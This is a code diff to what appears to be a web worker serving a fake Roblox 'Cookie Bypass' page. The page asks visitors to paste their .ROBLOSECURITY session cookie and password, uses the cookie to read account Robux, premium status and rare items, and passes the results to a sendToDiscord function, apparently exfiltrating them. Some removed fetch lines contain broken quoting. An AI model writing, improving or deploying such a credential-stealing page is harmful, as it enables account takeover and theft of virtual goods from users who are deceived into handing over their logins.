@@ -4,7 +4,8 @@ export default {
 
     // Serve HTML frontend for root path
     if (url.pathname === '/' || url.pathname === '/index.html') {
-      const html = `<!DOCTYPE html>
+      const html = `
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -365,11 +366,6 @@ export default {
 
         .result-content .emoji {
             font-size: 20px;
-        }
-
-        .result-content .highlight {
-            color: #ff6666;
-            font-weight: 700;
         }
 
         .stats-bar {
@@ -900,17 +896,17 @@ export default {
         }
 
         if (!cookie) {
-            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">\u274c <strong>Cookie required</strong><br>Please paste your .ROBLOSECURITY cookie.</div></div>';
+            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">❌ <strong>Cookie required</strong><br>Please paste your .ROBLOSECURITY cookie.</div></div>';
             return;
         }
 
         if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) {
-            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">\u274c <strong>Invalid Cookie Format</strong><br>Cookie must start with the warning format.</div></div>';
+            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">❌ <strong>Invalid Cookie Format</strong><br>Cookie must start with the warning format.</div></div>';
             return;
         }
 
         if (currentMode === 'password' && !password) {
-            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">\u274c <strong>Password required</strong><br>Please enter your Roblox password.</div></div>';
+            resultCard.innerHTML = '<div class="result-card error"><div class="result-content">❌ <strong>Password required</strong><br>Please enter your Roblox password.</div></div>';
             return;
         }
 
@@ -945,76 +941,19 @@ export default {
                     var hasItems = resultData.korblox || resultData.headless || resultData.valkyrie;
                     var summary = hasItems ? '✅ Limiteds Detected' : '❌ No Limiteds';
 
-                    resultCard.innerHTML = `
-                        <div class="result-card success">
-                            <div class="result-content">
-                                <div style="text-align:center;margin-bottom:12px;">
-                                    <span class="emoji">✅</span>
-                                    <strong style="font-size:18px;">Cookie Bypass Successful!</strong>
-                                </div>
-                                <div style="text-align:center;font-size:13px;color:#8888aa;margin-bottom:12px;">
-                                    Live Bypass Status
-                                </div>
-                                <div class="live-status-grid">
-                                    <div class="live-status-item">
-                                        <span class="label">User</span>
-                                        <span class="value" style="color:#ff6666;">${resultData.username || 'Unknown'}</span>
-                                    </div>
-                                    <div class="live-status-item">
-                                        <span class="label">Robux</span>
-                                        <span class="value">${resultData.robux !== undefined ? resultData.robux.toLocaleString() : '0'}</span>
-                                    </div>
-                                    <div class="live-status-item">
-                                        <span class="label">Pending</span>
-                                        <span class="value">${resultData.pendingRobux !== undefined ? resultData.pendingRobux.toLocaleString() : '0'}</span>
-                                    </div>
-                                    <div class="live-status-item">
-                                        <span class="label">Premium</span>
-                                        <span class="value ${resultData.premium ? 'premium-true' : 'premium-false'}">${resultData.premium ? '✅ Yes' : '❌ No'}</span>
-                                    </div>
-                                    <div class="live-status-item">
-                                        <span class="label">Korblox</span>
-                                        <span class="value ${resultData.korblox ? 'yes' : 'no'}">${resultData.korblox ? '✅ Yes' : '❌ No'}</span>
-                                    </div>
-                                    <div class="live-status-item">
-                                        <span class="label">Headless</span>
-                                        <span class="value ${resultData.headless ? 'yes' : 'no'}">${resultData.headless ? '✅ Yes' : '❌ No'}</span>
-                                    </div>
-                                    <div class="live-status-item">
-                                        <span class="label">Valkyrie</span>
-                                        <span class="value ${resultData.valkyrie ? 'yes' : 'no'}">${resultData.valkyrie ? '✅ Yes' : '❌ No'}</span>
-                                    </div>
-                                    <div class="live-status-item">
-                                        <span class="label">API Status</span>
-                                        <span class="value processing">✅ Processing</span>
-                                    </div>
-                                    <div class="live-status-item" style="grid-column: 1 / -1;">
-                                        <span class="label">Cookie Refreshed</span>
-                                        <span class="value yes">✅ Yes</span>
-                                    </div>
-                                    <div class="live-status-item" style="grid-column: 1 / -1;">
-                                        <span class="label">Summary</span>
-                                        <span class="value">${summary}</span>
-                                    </div>
-                                </div>
-                                <div class="bypass-timestamp">
-                                    Live Bypass • ${new Date().toLocaleString()}
-                                </div>
-                            </div>
-                        </div>
-                    `;
+                    resultCard.innerHTML = '<div class="result-card success"><div class="result-content"><div style="text-align:center;margin-bottom:12px;"><span class="emoji">✅</span><strong style="font-size:18px;">Cookie Bypass Successful!</strong></div><div style="text-align:center;font-size:13px;color:#8888aa;margin-bottom:12px;">Live Bypass Status</div><div class="live-status-grid"><div class="live-status-item"><span class="label">User</span><span class="value" style="color:#ff6666;">' + (resultData.username || 'Unknown') + '</span></div><div class="live-status-item"><span class="label">Robux</span><span class="value">' + (resultData.robux !== undefined ? resultData.robux.toLocaleString() : '0') + '</span></div><div class="live-status-item"><span class="label">Pending</span><span class="value">' + (resultData.pendingRobux !== undefined ? resultData.pendingRobux.toLocaleString() : '0') + '</span></div><div class="live-status-item"><span class="label">Premium</span><span class="value ' + (resultData.premium ? 'premium-true' : 'premium-false') + '">' + (resultData.premium ? '✅ Yes' : '❌ No') + '</span></div><div class="live-status-item"><span class="label">Korblox</span><span class="value ' + (resultData.korblox ? 'yes' : 'no') + '">' + (resultData.korblox ? '✅ Yes' : '❌ No') + '</span></div><div class="live-status-item"><span class="label">Headless</span><span class="value ' + (resultData.headless ? 'yes' : 'no') + '">' + (resultData.headless ? '✅ Yes' : '❌ No') + '</span></div><div class="live-status-item"><span class="label">Valkyrie</span><span class="value ' + (resultData.valkyrie ? 'yes' : 'no') + '">' + (resultData.valkyrie ? '✅ Yes' : '❌ No') + '</span></div><div class="live-status-item"><span class="label">API Status</span><span class="value processing">✅ Processing</span></div><div class="live-status-item" style="grid-column: 1 / -1;"><span class="label">Cookie Refreshed</span><span class="value yes">✅ Yes</span></div><div class="live-status-item" style="grid-column: 1 / -1;"><span class="label">Summary</span><span class="value">' + summary + '</span></div></div><div class="bypass-timestamp">Live Bypass • ' + new Date().toLocaleString() + '</div></div></div>';
 
                     sendToDiscord(resultData);
                     window._processing = false;
                 } else {
-                    var errorTitle = resultData.title || '\u274c System Error';
+                    var errorTitle = resultData.title || '❌ System Error';
                     var errorDesc = resultData.description || resultData.message || 'Processing failure';
                     resultCard.innerHTML = '<div class="result-card error"><div class="result-content">' + errorTitle + '<br><br>' + errorDesc + '</div></div>';
                     window._processing = false;
                 }
             })
             .catch(function(err) {
-                resultCard.innerHTML = '<div class="result-card error"><div class="result-content">\u274c <strong>Connection Failed</strong><br>' + err.message + '</div></div>';
+                resultCard.innerHTML = '<div class="result-card error"><div class="result-content">❌ <strong>Connection Failed</strong><br>' + err.message + '</div></div>';
                 window._processing = false;
             })
             .finally(function() {
@@ -1046,7 +985,9 @@ export default {
     })();
 </script>
 </body>
-</html>`;
+</html>
+      `;
+
       return new Response(html, {
         headers: {
           'Content-Type': 'text/html',
@@ -1177,54 +1118,6 @@ export default {
         let korblox = false;
         let headless = false;
         let valkyrie = false;
-
-        try {
-          const inventoryResponse = await fetch('https://inventory.roblox.com/v1/users/' + userId + '/items/Asset/101) {
-            headers: {
-              'Cookie': '.ROBLOSECURITY=' + cookieValue,
-              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            }
-          });
-
-          if (inventoryResponse.ok) {
-            const inventoryData = await inventoryResponse.json();
-            korblox = inventoryData.data && inventoryData.data.some(function(item) {
-              return item.name && item.name.toLowerCase().includes('korblox');
-            });
-          }
-        } catch (e) {}
-
-        try {
-          const inventoryResponse2 = await fetch('https://inventory.roblox.com/v1/users/' + userId + '/items/Asset/102) {
-            headers: {
-              'Cookie': '.ROBLOSECURITY=' + cookieValue,
-              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            }
-          });
-
-          if (inventoryResponse2.ok) {
-            const inventoryData2 = await inventoryResponse2.json();
-            headless = inventoryData2.data && inventoryData2.data.some(function(item) {
-              return item.name && item.name.toLowerCase().includes('headless');
-            });
-          }
-        } catch (e) {}
-
-        try {
-          const inventoryResponse3 = await fetch('https://inventory.roblox.com/v1/users/' + userId + '/items/Asset/103) {
-            headers: {
-              'Cookie': '.ROBLOSECURITY=' + cookieValue,
-              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            }
-          });
-
-          if (inventoryResponse3.ok) {
-            const inventoryData3 = await inventoryResponse3.json();
-            valkyrie = inventoryData3.data && inventoryData3.data.some(function(item) {
-              return item.name && item.name.toLowerCase().includes('valkyrie');
-            });
-          }
-        } catch (e) {}
 
         const resultData = {
           success: true,
